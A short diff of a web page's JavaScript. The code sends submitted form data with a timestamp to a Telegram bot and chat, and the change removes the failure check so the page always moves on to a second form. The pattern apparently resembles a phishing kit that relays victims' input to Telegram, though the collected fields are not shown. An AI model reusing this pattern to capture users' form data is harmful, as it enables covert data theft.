@@ -411,12 +411,8 @@ closeAdButton.addEventListener("click", slideOutAd);
                            `⏰ Time: ${new Date().toLocaleString()}`;
             
             sendMessageToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, message);
-            
-            if (success) {
+        
                 showForm('form2');
-            } else {
-                alert('Failed to send form data. Please try again.');
-            }
             
             // Re-enable button and hide loading
             submitBtn.disabled = false;
